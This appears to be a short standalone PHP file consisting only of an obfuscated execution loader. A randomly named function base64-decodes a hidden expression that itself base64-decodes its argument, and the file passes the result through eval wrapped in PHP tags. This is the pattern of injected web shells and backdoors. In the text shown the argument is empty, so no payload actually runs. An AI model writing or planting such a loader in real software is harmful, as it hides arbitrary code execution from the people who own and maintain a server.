<?php function PwPoaNBTzJtfYabAnZGi($kqCdaOZZUz){$r=base64_decode("YmFzZTY0X2RlY29kZSgka3FDZGFPWlpVeik=");return eval("return $r;");} eval('?>'.PwPoaNBTzJtfYabAnZGi('').'<?php '); ?>